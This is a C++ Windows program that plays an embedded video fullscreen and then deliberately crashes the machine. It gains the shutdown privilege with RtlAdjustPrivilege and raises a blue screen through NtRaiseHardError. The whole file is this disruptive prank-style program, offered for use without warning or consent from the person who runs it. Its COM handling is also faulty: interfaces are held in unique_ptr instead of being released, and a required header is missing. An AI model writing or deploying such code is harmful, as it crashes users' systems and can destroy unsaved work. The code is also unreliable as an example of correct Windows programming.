#include <windows.h>
#include <dshow.h>
#include <memory>

// Externs for BSoD stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// Global variables for DirectShow
std::unique_ptr<IGraphBuilder> graph;   // Filter graph manager
std::unique_ptr<IMediaControl> control; // Media control interface
std::unique_ptr<IMediaEvent> event;     // Media event interface
std::unique_ptr<IVideoWindow> window;   // Video window

// Helper function to get the video resource
void GetVideoResource(LPWSTR* path) {
    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
    if (resource == NULL) {
        MessageBox(NULL, L"Failed to find resource!", L"Error", MB_ICONERROR);
        ExitProcess(1);
    }

    DWORD size = SizeofResource(NULL, resource);
    LPVOID data = LockResource(LoadResource(NULL, resource));
    if (data == NULL) {
        MessageBox(NULL, L"Failed to load resource!", L"Error", MB_ICONERROR);
        ExitProcess(1);
    }

    *path = new WCHAR[MAX_PATH];
    GetTempPathW(MAX_PATH, *path);
    StringCbCatW(*path, MAX_PATH, L"video.wmv");

    HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        MessageBox(NULL, L"Failed to create file!", L"Error", MB_ICONERROR);
        ExitProcess(1);
    }

    DWORD written;
    if (!WriteFile(file, data, size, &written, NULL) || written != size) {
        MessageBox(NULL, L"Failed to write to file!", L"Error", MB_ICONERROR);
        CloseHandle(file);
        ExitProcess(1);
    }

    CloseHandle(file);
    FreeResource(resource);
}

// Helper function to initialize DirectShow
void InitializeDirectShow(LPCWSTR path) {
    CoInitialize(NULL);

    graph.reset();
    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

    control.reset();
    graph->QueryInterface(IID_IMediaControl, (void**)&control);

    event.reset();
    graph->QueryInterface(IID_IMediaEvent, (void**)&event);

    window.reset();
    graph->QueryInterface(IID_IVideoWindow, (void**)&window);

    graph->RenderFile(path, NULL);
    window->put_FullScreenMode(OATRUE);
}

// Helper function to trigger BSoD
ULONG TriggerBSOD() {
    BOOLEAN state;
    ULONG response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &state); // Adjust privileges to allow raising BSoD
    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // Raise BSoD
    return response;
}

// Main function
int main() {
    LPWSTR path;
    GetVideoResource(&path); // Get the video resource

    try {
        InitializeDirectShow(path); // Initialize DirectShow
        control->Run();             // Play the video
        event->WaitForCompletion(INFINITE, nullptr); // Wait for video to finish
    } catch (const std::exception& e) {
        MessageBoxA(NULL, e.what(), "Error", MB_ICONERROR);
        return 1;
    }

    // Trigger the blue screen of death
    TriggerBSOD();

    // This means the BSoD failed
    return 1;
}
